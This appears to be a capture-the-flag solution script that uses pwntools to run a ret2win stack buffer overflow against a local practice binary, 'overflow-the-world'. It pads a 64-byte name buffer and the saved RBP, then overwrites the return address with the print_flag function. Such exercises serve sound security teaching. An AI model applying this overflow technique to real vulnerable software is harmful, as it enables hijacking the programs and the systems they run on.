#!/usr/bin/env python3
from pwn import *

exe = ELF("./overflow-the-world")

r = process([exe.path])
# gdb.attach(r)

win = exe.symbols["print_flag"]
# write your payload here. We need to overflow the 64-byte name buffer,
# overwrite saved RBP (8 bytes) and then overwrite the saved return address
# with the address of print_flag (ret2win).
payload = b"A" * 64      # fill name buffer
payload += b"B" * 8      # overwrite saved RBP (stack save area)
payload += p64(win)       # overwrite saved return address with print_flag

r.recvuntil(b"What's your name? ")
r.sendline(payload)

r.recvuntil(b"Let's play a game.\n")
r.interactive()